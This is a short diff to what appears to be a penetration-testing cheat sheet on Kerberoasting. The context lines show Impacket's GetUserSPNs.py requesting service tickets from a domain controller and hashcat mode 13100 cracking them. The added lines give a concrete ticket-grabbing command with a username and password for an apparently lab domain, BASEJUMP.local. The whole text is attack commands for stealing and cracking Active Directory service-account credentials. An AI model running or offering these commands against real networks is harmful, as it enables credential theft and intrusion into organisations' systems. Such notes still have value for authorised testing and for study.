@@ -23,3 +23,8 @@ GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
 ```
 Hashcat -m 13100 <hash_file> <wordlist>
 ```
+
+#### Grab krb5tgs
+```
+sudo python3 GetUserSPNs.py BASEJUMP.local/rfeynman:Password -dc-ip $ip -request
+```
